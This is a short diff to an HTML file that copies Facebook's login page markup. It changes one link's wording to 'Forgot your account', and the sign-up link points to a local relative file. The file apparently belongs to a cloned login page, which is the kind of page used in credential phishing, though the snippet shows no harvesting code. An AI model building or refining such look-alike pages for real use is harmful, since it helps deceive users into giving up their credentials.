@@ -140,7 +140,7 @@
                                     <div class="_xkt">
                                         <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Login</button>
                                     </div>
-                                    <div class="_xkv fsm fwn fcg" id="login_link"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" id="forgot-password-link" target="">You forgot your account</a><span role="presentation" aria-hidden="true"> · </span><a href="ra8a6.html?next=https%3A%2F%2Fwww.facebook.com%2Frecover&amp;locale=el_GR&amp;display=page" rel="nofollow" id="reg-link">Sign up on Facebook</a></div>
+                                    <div class="_xkv fsm fwn fcg" id="login_link"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" id="forgot-password-link" target="">Forgot your account</a><span role="presentation" aria-hidden="true"> · </span><a href="ra8a6.html?next=https%3A%2F%2Fwww.facebook.com%2Frecover&amp;locale=el_GR&amp;display=page" rel="nofollow" id="reg-link">Sign up on Facebook</a></div>
                                 </div>
                                 <input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" value="" />
                                 <input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source" />
